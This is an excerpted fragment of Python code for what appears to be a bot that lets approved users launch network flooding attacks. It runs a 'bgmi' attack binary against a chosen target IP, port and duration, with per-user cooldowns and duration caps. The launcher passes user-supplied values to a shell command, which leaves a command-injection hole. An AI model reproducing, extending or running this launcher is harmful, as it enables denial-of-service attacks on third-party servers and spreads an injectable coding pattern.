...
ORIGINAL_BGMI_PATH = 'bgmi'      #ADD YOUR FILES PATH HERE 
...
USER_COOLDOWN = 180  # Cooldown time for normal users in seconds
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 600", shell=True)
...
def handle_attack_details(message):
    ...
    if user_id in allowed_user_ids:
        try:
            ...
            MAX_DURATION = 500  # Set maximum duration (in seconds) for Normal users
